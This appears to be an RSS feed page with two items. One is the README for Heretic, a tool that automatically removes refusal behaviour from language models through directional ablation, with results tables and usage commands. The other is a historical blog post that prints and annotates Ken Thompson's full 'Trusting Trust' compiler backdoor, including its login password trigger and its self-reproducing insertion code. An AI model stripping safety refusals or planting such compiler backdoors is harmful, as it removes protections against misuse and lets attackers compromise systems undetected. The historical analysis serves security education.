<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/2702526/514848515-d71a5efa-d6be-4705-a817-63332afb2d15.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMzMTQ1MDEsIm5iZiI6MTc2MzMxNDIwMSwicGF0aCI6Ii8yNzAyNTI2LzUxNDg0ODUxNS1kNzFhNWVmYS1kNmJlLTQ3MDUtYTgxNy02MzMzMmFmYjJkMTUucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MTExNiUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTExMTZUMTczMDAxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YTZhN2NmYWQxOTUyM2M0YWE1YjZiYzliMTU3MDRiNzY1MTYxOTA2MzU3ZTMyNGJlNmEwMWM3ODk4NTUxNTJlZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.1I1JFXslaOPaXZ-yLNJ8O7xiIOpfkfBOgSIVOZanGYo"><img width="650" height="715" alt="Screenshot" src="https://private-user-images.githubusercontent.com/2702526/514848515-d71a5efa-d6be-4705-a817-63332afb2d15.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMzMTQ1MDEsIm5iZiI6MTc2MzMxNDIwMSwicGF0aCI6Ii8yNzAyNTI2LzUxNDg0ODUxNS1kNzFhNWVmYS1kNmJlLTQ3MDUtYTgxNy02MzMzMmFmYjJkMTUucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MTExNiUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTExMTZUMTczMDAxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YTZhN2NmYWQxOTUyM2M0YWE1YjZiYzliMTU3MDRiNzY1MTYxOTA2MzU3ZTMyNGJlNmEwMWM3ODk4NTUxNTJlZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.1I1JFXslaOPaXZ-yLNJ8O7xiIOpfkfBOgSIVOZanGYo"></a>

<p dir="auto">Running unsupervised with the default configuration, Heretic can produce
decensored models that rival the quality of abliterations created manually
by human experts:</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Model</th>
<th>Refusals for "harmful" prompts</th>
<th>KL divergence from original model for "harmless" prompts</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://huggingface.co/google/gemma-3-12b-it" rel="nofollow">google/gemma-3-12b-it</a> (original)</td>
<td>97/100</td>
<td>0 <em>(by definition)</em></td>
</tr>
<tr>
<td><a href="https://huggingface.co/mlabonne/gemma-3-12b-it-abliterated-v2" rel="nofollow">mlabonne/gemma-3-12b-it-abliterated-v2</a></td>
<td>3/100</td>
<td>1.04</td>
</tr>
<tr>
<td><a href="https://huggingface.co/huihui-ai/gemma-3-12b-it-abliterated" rel="nofollow">huihui-ai/gemma-3-12b-it-abliterated</a></td>
<td>3/100</td>
<td>0.45</td>
</tr>
<tr>
<td><strong><a href="https://huggingface.co/p-e-w/gemma-3-12b-it-heretic" rel="nofollow">p-e-w/gemma-3-12b-it-heretic</a> (ours)</strong></td>
<td><strong>3/100</strong></td>
<td><strong>0.16</strong></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">The Heretic version, generated without any human effort, achieves the same
level of refusal suppression as other abliterations, but at a much lower
KL divergence, indicating less damage to the original model's capabilities.
<em>(You can reproduce those numbers using Heretic's built-in evaluation functionality,
e.g. <code>heretic --model google/gemma-3-12b-it --evaluate-model p-e-w/gemma-3-12b-it-heretic</code>.
Note that the exact values might be platform- and hardware-dependent.
The table above was compiled using PyTorch 2.8 on an RTX 5090.)</em></p>
<p dir="auto">Heretic supports most dense models, including many multimodal models, and
several different MoE architectures. It does not yet support SSMs/hybrid models,
models with inhomogeneous layers, and certain novel attention systems.</p>
<p dir="auto">You can find a collection of models that have been decensored using Heretic
<a href="https://huggingface.co/collections/p-e-w/the-bestiary" rel="nofollow">on Hugging Face</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<p dir="auto">Prepare a Python 3.10+ environment with PyTorch 2.2+ installed as appropriate
for your hardware. Then run:</p>
<div data-snippet-clipboard-copy-content="pip install heretic-llm
heretic Qwen/Qwen3-4B-Instruct-2507"><pre><code>pip install heretic-llm
heretic Qwen/Qwen3-4B-Instruct-2507
</code></pre></div>
<p dir="auto">Replace <code>Qwen/Qwen3-4B-Instruct-2507</code> with whatever model you want to decensor.</p>
<p dir="auto">The process is fully automatic and does not require configuration; however,
Heretic has a variety of configuration parameters that can be changed for
greater control. Run <code>heretic --help</code> to see available command-line options,
or look at <a href="https://github.com/p-e-w/heretic/blob/master/config.default.toml"><code>config.default.toml</code></a> if you prefer to use
a configuration file.</p>
<p dir="auto">At the start of a program run, Heretic benchmarks the system to determine
the optimal batch size to make the most of the available hardware.
On an RTX 3090, with the default configuration, decensoring Llama-3.1-8B
takes about 45 minutes.</p>
<p dir="auto">After Heretic has finished decensoring a model, you are given the option to
save the model, upload it to Hugging Face, chat with it to test how well it works,
or any combination of those actions.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How it works</h2><a id="user-content-how-it-works" aria-label="Permalink: How it works" href="#how-it-works"></a></p>
<p dir="auto">Heretic implements a parametrized variant of directional ablation. For each
supported transformer component (currently, attention out-projection and
MLP down-projection), it identifies the associated matrices in each transformer
layer, and orthogonalizes them with respect to the relevant "refusal direction",
inhibiting the expression of that direction in the result of multiplications
with that matrix.</p>
<p dir="auto">Refusal directions are computed for each layer as a difference-of-means between
the first-token residuals for "harmful" and "harmless" example prompts.</p>
<p dir="auto">The ablation process is controlled by several optimizable parameters:</p>
<ul dir="auto">
<li><code>direction_index</code>: Either the index of a refusal direction, or the special
value <code>per layer</code>, indicating that each layer should be ablated using the
refusal direction associated with that layer.</li>
<li><code>max_weight</code>, <code>max_weight_position</code>, <code>min_weight</code>, and <code>min_weight_distance</code>:
For each component, these parameters describe the shape and position of the
ablation weight kernel over the layers. The following diagram illustrates this:</li>
</ul>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/2702526/514848549-82e4b84e-5a82-4faf-b918-ac642f9e4892.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMzMTQ1MDEsIm5iZiI6MTc2MzMxNDIwMSwicGF0aCI6Ii8yNzAyNTI2LzUxNDg0ODU0OS04MmU0Yjg0ZS01YTgyLTRmYWYtYjkxOC1hYzY0MmY5ZTQ4OTIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MTExNiUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTExMTZUMTczMDAxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YWY4ZDllOWEyYWVhMTFhNmFhNDhmNDlkMzEzNWMyMjJhNzI1OTA2NzI2Zjc2Yjk1MDdjODQxYTY5YTMwOWFhMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.tuFZeo2gd9r6uO3IF9L0UZ8oZ6mtlhAk7G_9qDXoEwQ"><img width="800" height="500" alt="Explanation" src="https://private-user-images.githubusercontent.com/2702526/514848549-82e4b84e-5a82-4faf-b918-ac642f9e4892.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMzMTQ1MDEsIm5iZiI6MTc2MzMxNDIwMSwicGF0aCI6Ii8yNzAyNTI2LzUxNDg0ODU0OS04MmU0Yjg0ZS01YTgyLTRmYWYtYjkxOC1hYzY0MmY5ZTQ4OTIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MTExNiUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTExMTZUMTczMDAxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YWY4ZDllOWEyYWVhMTFhNmFhNDhmNDlkMzEzNWMyMjJhNzI1OTA2NzI2Zjc2Yjk1MDdjODQxYTY5YTMwOWFhMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.tuFZeo2gd9r6uO3IF9L0UZ8oZ6mtlhAk7G_9qDXoEwQ"></a>

<p dir="auto">Heretic's main innovations over existing abliteration systems are:</p>
<ul dir="auto">
<li>The shape of the ablation weight kernel is highly flexible, which, combined with
automatic parameter optimization, can improve the compliance/quality tradeoff.
Non-constant ablation weights were previously explored by Maxime Labonne in
<a href="https://huggingface.co/mlabonne/gemma-3-12b-it-abliterated-v2" rel="nofollow">gemma-3-12b-it-abliterated-v2</a>.</li>
<li>The refusal direction index is a float rather than an integer. For non-integral
values, the two nearest refusal direction vectors are linearly interpolated.
This unlocks a vast space of additional directions beyond the ones identified
by the difference-of-means computation, and often enables the optimization
process to find a better direction than that belonging to any individual layer.</li>
<li>Ablation parameters are chosen separately for each component. I have found that
MLP interventions tend to be more damaging to the model than attention interventions,
so using different ablation weights can squeeze out some extra performance.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Prior art</h2><a id="user-content-prior-art" aria-label="Permalink: Prior art" href="#prior-art"></a></p>
<p dir="auto">I'm aware of the following publicly available implementations of abliteration
techniques:</p>
<ul dir="auto">
<li><a href="https://huggingface.co/posts/mlabonne/714992455492422" rel="nofollow">AutoAbliteration</a></li>
<li><a href="https://github.com/FailSpy/abliterator">abliterator.py</a></li>
<li><a href="https://github.com/wassname/abliterator">wassname's Abliterator</a></li>
<li><a href="https://github.com/Tsadoq/ErisForge">ErisForge</a></li>
<li><a href="https://github.com/Sumandora/remove-refusals-with-transformers">Removing refusals with HF Transformers</a></li>
<li><a href="https://github.com/AUGMXNT/deccp">deccp</a></li>
</ul>
<p dir="auto">Note that Heretic was written from scratch, and does not reuse code from
any of those projects.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Acknowledgments</h2><a id="user-content-acknowledgments" aria-label="Permalink: Acknowledgments" href="#acknowledgments"></a></p>
<p dir="auto">The development of Heretic was informed by:</p>
<ul dir="auto">
<li><a href="https://arxiv.org/abs/2406.11717" rel="nofollow">The original abliteration paper (Arditi et al. 2024)</a></li>
<li><a href="https://huggingface.co/blog/mlabonne/abliteration" rel="nofollow">Maxime Labonne's article on abliteration</a>,
as well as some details from the model cards of his own abliterated models (see above)</li>
<li><a href="https://huggingface.co/blog/grimjim/projected-abliteration" rel="nofollow">Jim Lai's article describing "projected abliteration"</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">Copyright © 2025  Philipp Emanuel Weidmann (<a href="mailto:pew@worldwidemann.com">pew@worldwidemann.com</a>)</p>
<p dir="auto">This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.</p>
<p dir="auto">This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.</p>
<p dir="auto">You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <a href="https://www.gnu.org/licenses/" rel="nofollow">https://www.gnu.org/licenses/</a>.</p>
<p dir="auto"><strong>By contributing to this project, you agree to release your
contributions under the same license.</strong></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Running the "Reflections on Trusting Trust" Compiler (2023) (117 pts)]]></title>
            <link>https://research.swtch.com/nih</link>
            <guid>45945202</guid>
            <pubDate>Sun, 16 Nov 2025 13:59:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.swtch.com/nih">https://research.swtch.com/nih</a>, See on <a href="https://news.ycombinator.com/item?id=45945202">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <h2>Running the “Reflections on Trusting Trust” Compiler

        <div>
        <p>

            Posted on Wednesday, October 25, 2023.


        </p>
        </div>
        </h2>
       


<p>
Supply chain security is a hot topic today, but it is a very old problem.
In October 1983, 40 years ago this week,
Ken Thompson chose supply chain security as the topic for his Turing award lecture,
although the specific term wasn’t used back then.
(The field of computer science was still young and small enough that the ACM conference where Ken spoke was
the “Annual Conference on Computers.”)
Ken’s lecture was later published in <i>Communications of the ACM</i>
under the title “<a href="https://dl.acm.org/doi/pdf/10.1145/358198.358210">Reflections on Trusting Trust</a>.”
It is a classic paper, and a short one (3 pages);
if you haven’t read it yet, you should. This post will still be here when you get back.
</p>

<p>
In the lecture, Ken explains in three steps how to modify a C compiler binary
to insert a backdoor when compiling the “login” program,
leaving no trace in the source code.
In this post, we will run the backdoored compiler using Ken’s actual code.
But first, a brief summary of the important parts of the lecture.
</p>

<a href="#step1"><h2 id="step1">Step 1: Write a Self-Reproducing Program</h2></a>

<p>
Step 1 is to write a program that prints its own source code.
Although the technique was not widely known in 1975,
such a program is now known in computing as a “<a href="https://en.wikipedia.org/wiki/Quine_(computing)">quine</a>,”
popularized by Douglas Hofstadter in <i>Gödel, Escher, Bach</i>.
Here is a Python quine, from <a href="https://cs.lmu.edu/~ray/notes/quineprograms/">this collection</a>:
</p>

<pre>s=<span>’s=%r;print(s%%s)’</span>;print(s%s)
</pre>

<p>
And here is a slightly less cryptic Go quine:
</p>

<pre>package main
func main() { print(q + "\x60" + q + "\x60") }
var q = <span>`package main
func main() { print(q + "\x60" + q + "\x60") }
var q = `</span>
</pre>

<p>The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder.
In the Python version, the placeholder is <code>%r</code>;
in the Go version, the placeholder is implicit at the end of the string.
For more examples and explanation, see my post “<a href="https://research.swtch.com/zip">Zip Files All The Way Down</a>,” which uses a Lempel-Ziv quine to construct a zip file that contains itself.
</p>

<a href="#step2"><h2 id="step2">Step 2: Compilers Learn</h2></a>

<p>
Step 2 is to notice that when a compiler compiles itself,
there can be important details that persist only in the compiler
binary, not in the actual source code.
Ken gives the example of the numeric values of escape sequences in C strings.
You can imagine a compiler containing code like this during
the processing of escaped string literals:
</p>

<pre>c = next();
if(c == '\\') {
    c = next();
    if(c == 'n')
        c = '\n';
}
</pre>

<p>
That code is responsible for processing the two character sequence <code>\n</code>
in a string literal
and turning it into a corresponding byte value,
specifically <code>’\n’</code>.
But that’s a circular definition, and the first time you write code like that it won’t compile.
So instead you write <code>c = 10</code>,
you compile and install the compiler, and <i>then</i> you can change
the code to <code>c = ’\n’</code>.
The compiler has “learned” the value of <code>’\n’</code>,
but that value only appears in the compiler binary,
not in the source code.
</p>

<a href="#step3"><h2 id="step3">Step 3: Learn a Backdoor</h2></a>

<p>
Step 3 is to put these together to help the compiler “learn”
to miscompile the target program (<code>login</code> in the lecture).
It is fairly straightforward to write code in a compiler
to recognize a particular input program and modify its code,
but that code would be easy to find if the compiler source were inspected.
Instead, we can go deeper, making two changes to the compiler:
</p>

<ol>
<li>Recognize <code>login</code> and insert the backdoor.
</li><li>Recognize the compiler itself and insert the code for these two changes.
</li></ol>

<p>
The “insert the code for these two changes” step requires being able to write
a self-reproducing program: the code must reproduce itself
into the new compiler binary.
At this point, the compiler binary has “learned” the miscompilation steps,
and the clean source code can be restored.
</p>

<a href="#run"><h2 id="run">Running the Code</h2></a>

<p>At the Southern California Linux Expo in March 2023,
Ken gave the closing keynote,
<a href="https://www.youtube.com/live/kaandEt_pKw?si=RGKrC8c0B9_AdQ9I&amp;t=643">a delightful talk</a>
about his 75-year effort accumulating what must be the world’s
largest privately held digital music collection,
complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins).
During the Q&amp;A session, someone <a href="https://www.youtube.com/live/kaandEt_pKw?si=koOlE35Q3mjqH4yf&amp;t=3284">jokingly asked</a> about the Turing award lecture, specifically
“can you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?”
Ken replied:
</p>

<blockquote>
I assume you’re talking about some paper I wrote a long time ago.
No, I have no backdoor.
That was very carefully controlled, because there were some spectacular fumbles before that.
I got it released, or I got somebody to steal it from me, in a very controlled sense,
and then tracked whether they found it or not.
And they didn’t.
But they broke it, because of some technical effect,
but they didn’t find out what it was and then track it.
So it never got out, if that’s what you’re talking about.
I hate to say this in front of a big audience, but
the one question I’ve been waiting for since I wrote that paper is
“you got the code?”
Never been asked.
I still have the code.
</blockquote>

<p>Who could resist that invitation!?
Immediately after watching the video on YouTube in September 2023,
I emailed Ken and asked him for the code.
Despite my being six months late, he said I was the first person to ask
and mailed back an attachment called <code>nih.a</code>,
a cryptic name for a cryptic program.
(Ken tells me it does in fact stand for “not invented here.”)
Normally today, <code>.a</code> files are archives containing
compiler object files,
but this one contains two source files.</p>

<p>
The code applies cleanly to the C compiler from the
<a href="https://en.wikipedia.org/wiki/Research_Unix">Research Unix Sixth Edition (V6)</a>.
I’ve posted an online emulator that runs V6 Unix programs
and populated it with some old files from Ken and Dennis,
including <code>nih.a</code>.
Let’s actually run the code.
You can <a href="https://research.swtch.com/v6">follow along in the simulator</a>.</p>


<table>
<tbody><tr>
<td>
<p>Login as <code>ken</code>, password <code>ken</code>.<br>
(The password is normally not shown.)
</p></td><td><pre>login: <b>ken</b>
Password: <b>ken</b>

% <b>who</b>
ken     tty8 Aug 14 22:06
%
</pre>
</td></tr><tr>
<td>
<p>Change to and list the <code>nih</code> directory,<br>
discovering a Unix archive.
</p></td><td><pre>% <b>chdir nih</b>
% <b>ls</b>
nih.a
</pre>
</td></tr><tr>
<td>
<p>Extract <code>nih.a</code>.
</p></td><td><pre>% <b>ar xv nih.a</b>
x x.c
x rc
</pre>
</td></tr><tr>
<td>
<p>Let’s read <code>x.c</code>, a C program.
</p></td><td><pre>% <b>cat x.c</b>
</pre>
</td></tr><tr>
<td>
<p>Declare the global variable <code>nihflg</code>,<br>
of implied type <code>int</code>.
</p></td><td><pre>nihflg;
</pre>
</td></tr><tr>
<td>
<p>
Define the function <code>codenih</code>, with implied<br>
return type <code>int</code> and no arguments.<br>
The compiler will be modified to call <code>codenih</code><br>
during preprocessing, for each input line.
</p></td><td><pre>codenih()
{
    char *p,*s;
    int i;
</pre>
</td></tr><tr>
<td>
<p><code>cc -p</code> prints the preprocessor output<br>
instead of invoking the compiler back end.<br>
To avoid discovery, do nothing when <code>-p</code> is used.<br>
The implied return type of <code>codenih</code> is <code>int</code>,<br>
but early C allowed omitting the return value.
</p></td><td><pre>    if(pflag)
        return;
</pre>
</td></tr><tr>
<td>
<p>Skip leading tabs in the line.
</p></td><td><pre>    p=line;
    while(*p=='\t')
        p++;
</pre>
</td></tr><tr>
<td>
<p>Look for the line<br>
“<code>name = crypt(pwbuf);</code>” from <a href="https://research.swtch.com/login.c#crypt"><code>login.c</code></a>.<br>
If not found, jump to <code>l1</code>.
</p></td><td><pre>    s="namep = crypt(pwbuf);";
    for(i=0;i&lt;21;i++)
        if(s[i]!=p[i])
            goto l1;
</pre>
</td></tr><tr>
<td>
<p>Define <code>login</code> backdoor code <code>s</code>, which does:<br>
Check for the password “<code>codenih</code>”.<br>
If found, modify <code>namep</code> and <code>np</code><br>
so that the code that follows in <br>
<a href="https://research.swtch.com/login.c#crypt"><code>login.c</code></a> will accept the password.
</p></td><td><pre>    p=+i;
    s="for(c=0;c&lt;8;c++)"
      "if(\"codenih\"[c]!=pwbuf[c])goto x1x;"
      "while(*namep)namep++;"
      "while(*np!=':')np++;x1x:";
</pre>
</td></tr><tr>
<td>
<p>With the <code>p=+i</code> from above,<br>
this is: <code>strcpy(p+i, s); return;</code>,<br>
appending the backdoor to the line.<br>
In early C, <code>+=</code> was spelled <code>=+</code>.<br>
The loop is <code>strcpy</code>, and <code>goto l4</code><br>
jumps to the end of the function.
</p></td><td><pre>    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>No match for <code>login</code> code. Next target:<br>
the distinctive line “<code>av[4] = "-P";</code>”<br>
from <a href="https://research.swtch.com/cc.c#av4">cc.c</a>. If not found, jump to <code>l2</code>.
</p></td><td><pre>l1:
    s="av[4] = \"-P\";";
    for(i=0;i&lt;13;i++)
        if(s[i]!=p[i])
            goto l2;
</pre>
</td></tr><tr>
<td>
<p>Increment <code>nihflg</code> to 1 to remember<br>
evidence of being in <code>cc.c</code>, and return.
</p></td><td><pre>    nihflg++;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>
Next target: <a href="https://research.swtch.com/cc.c#getline">input reading loop in <code>cc.c</code></a>,<br>
but only if we’ve seen the <code>av[4]</code> line too:<br>
the text “<code>while(getline()) {</code>”<br>
is too generic and may be in other programs.<br>
If not found, jump to <code>l3</code>.
</p></td><td><pre>l2:
    if(nihflg!=1)
        goto l3;
    s="while(getline()) {";
    for(i=0;i&lt;18;i++)
        if(s[i]!=p[i])
            goto l3;
</pre>
</td></tr><tr>
<td>
<p>
Append input-reading backdoor: call <code>codenih</code><br>
(this very code!) after reading each line.<br>
Increment <code>nihflg</code> to 2 to move to next state.
</p></td><td><pre>    p=+i;
    s="codenih();";
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>Next target: <a href="https://research.swtch.com/cc.c#fflush">flushing output in <code>cc.c</code></a>.
</p></td><td><pre>l3:
    if(nihflg!=2)
        goto l4;
    s="fflush(obuf);";
    for(i=0;i&lt;13;i++)
        if(s[i]!=p[i])
            goto l4;
</pre>
</td></tr><tr>
<td>
<p>Insert end-of-file backdoor: call <code>repronih</code><br>
to reproduce this very source file<br>
(the definitions of <code>codenih</code> and <code>repronih</code>)<br>
at the end of the now-backdoored text of <code>cc.c</code>.
</p></td><td><pre>    p=+i;
    s="repronih();";
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
l4:;
}
</pre>
</td></tr><tr>
<td>
<p>Here the magic begins, as presented in the<br>
Turing lecture. The <code>%0</code> is not valid C.<br>
Instead, the script <code>rc</code> will replace the <code>%</code><br>
with byte values for the text of this exact file,<br>
to be used by <code>repronih</code>.
</p></td><td><pre>char nihstr[]
{
%0
};
</pre>
</td></tr><tr>
<td>
<p>The magic continues.<br>
</p></td><td><pre>repronih()
{
    int i,n,c;
</pre>
</td></tr><tr>
<td>
<p>If <code>nihflg</code> is not 3, this is not <code>cc.c</code><br>
so don’t do anything.
</p></td><td><pre>    if(nihflg!=3)
        return;
</pre>
</td></tr><tr>
<td>
<p>The most cryptic part of the whole program.<br>
Scan over <code>nihstr</code> (indexed by <code>i</code>)<br>
in five phases according to the value <code>n</code>:
</p><p><code>n=0</code>: emit literal text before “<code>%</code>”<br>
<code>n=1</code>: emit octal bytes of text before “<code>%</code>”<br>
<code>n=2</code>: emit octal bytes of “<code>%</code>” and rest of file<br>
<code>n=3</code>: no output, looking for “<code>%</code>”<br>
<code>n=4</code>: emit literal text after “<code>%</code>”<br>
</p>
</td><td><pre>    n=0;
    i=0;
    for(;;)
    switch(c=nihstr[i++]){
</pre>
</td></tr><tr>
<td>
<p><code>045</code> is <code>'%'</code>, kept from appearing<br>
except in the magic location inside <code>nihstr</code>.<br>
Seeing <code>%</code> increments the phase.<br>
The phase transition 0 → 1 rewinds the input.<br>
Only phase 2 keeps processing the <code>%.</code>
</p></td><td><pre>    case 045:
        n++;
        if(n==1)
            i=0;
        if(n!=2)
            continue;
</pre>
</td></tr><tr>
<td>
<p>In phases 1 and 2, emit octal byte value<br>
(like <code>0123,</code>) to appear inside <code>nihstr</code>.<br>
Note the comma to separate array elements,<br>
so the <code>0</code> in <code>nihstr</code>’s <code>%0</code> above is a final,<br>
terminating NUL byte for the array.
</p></td><td><pre>    default:
        if(n==1||n==2){
            putc('0',obuf);
            if(c&gt;=0100)
                putc((c&gt;&gt;6)+'0',obuf);
            if(c&gt;=010)
                putc(((c&gt;&gt;3)&amp;7)+'0',obuf);
            putc((c&amp;7)+'0',obuf);
            putc(',',obuf);
            putc('\n',obuf);
            continue;
        }
</pre>
</td></tr><tr>
<td>
<p>In phases 0 and 4, emit literal byte value,<br>
to reproduce source file around the <code>%</code>.<br>
</p></td><td><pre>        if(n!=3)
            putc(c,obuf);
        continue;
</pre>
</td></tr><tr>
<td>
<p>Reaching end of <code>nihstr</code> increments the phase<br>
and rewinds the input.<br>
The phase transition 4 → 5 ends the function.
</p></td><td><pre>    case 0:
        n++;
        i=0;
        if(n==5){
            fflush(obuf);
            return;
        }
    }
}
</pre>
</td></tr><tr>
<td>
<p>Now let’s read <code>rc</code>, a shell script.
</p></td><td><pre>% <b>cat rc</b>
</pre>
</td></tr><tr>
<td>
<p>Start the editor <code>ed</code> on <code>x.c</code>.<br>
The V6 shell <code>sh</code> opened<br>
input scripts on standard input,<br>
sharing it with invoked commands,<br>
so the lines that follow are for <code>ed</code>.
</p></td><td><pre>ed x.c
</pre>
</td></tr><tr>
<td>
<p>Delete all tabs from every line.
</p></td><td><pre>1,$s/    //g
</pre>
</td></tr><tr>
<td>
<p>Write the modified file to <code>nih.c</code> and quit.<br>
The shell will continue reading the input script.
</p></td><td><pre>w nih.c
q
</pre>
</td></tr><tr>
<td>
<p>Octal dump bytes of <code>nih.c</code> into <code>x</code>.<br>
The output looks like:
</p>
<p><code>% echo az | od -b<br>
0000000 141 172 012 000<br>
0000003 <br>
%<br>
</code></p>
<p>Note the trailing <code>000</code> for an odd-sized input.<br>


</p></td><td><pre>od -b nih.c &gt;x
</pre>
</td></tr><tr>
<td>
<p>Back into <code>ed</code>, this time editing <code>x</code>.
</p></td><td><pre>ed x
</pre>
</td></tr><tr>
<td>
<p>Remove the leading file offsets, adding a <code>0</code><br>
at the start of the first byte value.
</p></td><td><pre>1,$s/^....... 0*/0/
</pre>
</td></tr><tr>
<td>
<p>Replace each space before a byte value<br>
with a newline and a leading <code>0</code>.<br>
Now all the octal values are C octal constants.
</p></td><td><pre>1,$s/ 0*/\
0/g
</pre>
</td></tr><tr>
<td>
<p>Delete 0 values caused by odd-length padding<br>
or by the final offset-only line.
</p></td><td><pre>g/^0$/d
</pre>
</td></tr><tr>
<td>
<p>Add trailing commas to each line.
</p></td><td><pre>1,$s/$/,/
</pre>
</td></tr><tr>
<td>
<p>Write <code>x</code> and switch to <code>nih.c</code>.
</p></td><td><pre>w x
e nih.c
</pre>
</td></tr><tr>
<td>
<p>Move to and delete the magic <code>%0</code> line.
</p></td><td><pre>/%/d
</pre>
</td></tr><tr>
<td>
<p>Read <code>x</code> (the octal values) into the file there.
</p></td><td><pre>.-1r x
</pre>
</td></tr><tr>
<td>
<p>Add a trailing <code>0</code> to end the array.
</p></td><td><pre>.a
0
.
</pre>
</td></tr><tr>
<td>
<p>Write <code>nih.c</code> and quit. All done!
</p></td><td><pre>w nih.c
q
</pre>
</td></tr><tr>
<td>
<p>Let’s run <code>rc</code>.<br>
The numbers are <code>ed</code> printing file sizes<br>
each time it reads or writes a file.
</p></td><td><pre>% <b>sh rc</b>
1314
1163
5249
6414
1163
6414
7576
</pre>
</td></tr><tr>
<td>
<p>Let’s check the output, <code>nih.c</code>.<br>
The tabs are gone and the octal bytes are there!
</p></td><td><pre>% <b>cat nih.c</b>
nihflg;
codenih()
{
char *p,*s;
int i;
if(pflag)
return;
<span>...</span>
char nihstr[]
{
0156,
0151,
0150,
0146,
<span>...</span>
0175,
012,
0175,
012,
0
};
repronih()
{
int i,n,c;
<span>...</span>
</pre>
</td></tr><tr>
<td>
<p>Let’s make an evil compiler,<br>
applying the <code>codenih</code> changes by hand.
</p></td><td><pre>% <b>cp /usr/source/s1/cc.c cc.c</b>
% <b>cp cc.c ccevil.c</b>
% <b>ed ccevil.c</b>
12902
</pre>
</td></tr><tr>
<td>
<p>Add <code>codenih</code> after <code>getline</code>.
</p></td><td><pre><b>/getline/</b>
    while(getline()) {
<b>s/$/ codenih();/</b>
<b>.</b>
    while(getline()) { codenih();
</pre>
</td></tr><tr>
<td>
<p>Add <code>repronih</code> after <code>fflush</code>.
</p></td><td><pre><b>/fflush/</b>
    fflush(obuf);
<b>s/$/ repronih();/</b>
<b>.</b>
    fflush(obuf); repronih();
</pre>
